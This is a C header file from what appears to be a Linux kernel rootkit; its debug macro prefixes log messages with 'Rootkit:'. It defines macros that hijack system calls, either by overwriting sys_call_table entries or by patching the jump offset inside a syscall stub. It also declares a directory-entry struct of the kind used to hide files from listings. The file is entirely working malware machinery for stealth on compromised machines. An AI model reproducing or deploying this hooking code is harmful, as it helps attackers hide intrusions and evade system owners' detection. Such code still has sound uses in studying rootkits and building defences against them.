#ifndef __RT_MAIN__
#define __RT_MAIN__

#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/errno.h>
#include <linux/list.h>
#include <net/tcp.h>
#include <linux/in.h>
#include <linux/module.h> /* module_init module_exit */
#include <linux/init.h> /* __init __exit */
#include <linux/syscalls.h> /* sys_close __NR_close __NR_mkdir */
#include <linux/delay.h> /* loops_per_jiffy */
#include <asm/bitops.h> /* set_bit clear_bit */

#define DEBUG

#ifdef DEBUG  
# define DLog(fmt, ... ) printk(("Rootkit:%s-[%s]:%d " fmt "\n"), __FILE__, __FUNCTION__, __LINE__, ##__VA_ARGS__);  
#else  
# define DLog(...);  
#endif  

#ifndef __AVOID_NULL__
#define __AVOID_NULL__

#define AvoidNull(call, args1) {\
if(args1) call(args1);\
}

#endif 




// define a struct to save system call
#define RT_SYSCALL_DEFINE(ret, name, args...) \
union {\
    unsigned long val;\
    asmlinkage ret (*fuc)(args);\
}orig_sys_##name;\
asmlinkage ret rt_sys_##name(args)

// call the original function
#define RT_SYSCALL_CALL(name, args...) (orig_sys_##name.fuc(args))

// replace the original system call
#define RT_SYSCALL_REPLACE(name) {\
orig_sys_##name.val = sys_call_table[__NR_##name];\
sys_call_table[__NR_##name] = (unsigned long)(rt_sys_##name);\
}

// restore the system call
#define RT_SYSCALL_RESTORE(name) {\
sys_call_table[__NR_##name] = (unsigned long)(orig_sys_##name.val);\
}



// define a struct to save system call
#define RT_SYSCALL_DEFINE_JMP(ret, name, args...) \
union {\
    unsigned long val;\
    asmlinkage ret (*fuc)(args);\
}orig_sys_##name;\
unsigned int offset_##name = 0;\
unsigned char *poffset_##name = NULL;\
asmlinkage ret rt_sys_##name(args)

// call the original function
#define RT_SYSCALL_CALL_JMP(name, args...) (orig_sys_##name.fuc(args))

// replace the original system call
#define RT_SYSCALL_REPLACE_JMP(name) {\
    poffset_##name = (unsigned char*)sys_call_table[__NR_##name];\
    for (;(unsigned int)poffset_##name < sys_call_table[__NR_##name] + 16; poffset_##name++)\
    {\
        if ((unsigned char)(*poffset_##name++) == (unsigned char)(0xE9))\
        {\
            offset_##name = *((unsigned int *)poffset_##name);\
            orig_sys_##name.val = (unsigned int)poffset_##name + 4 + offset_##name;\
            *((unsigned int *)poffset_##name) = (unsigned int)rt_sys_##name\
                                              - (unsigned int)poffset_##name - 4;\
            break;\
        }\
    }\
}

// restore the system call
#define RT_SYSCALL_RESTORE_JMP(name) {\
    if (poffset_##name)\
    {\
        *((unsigned int *)poffset_##name) = offset_##name;\
    }\
}

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};



#endif // __RT_ONLINE__
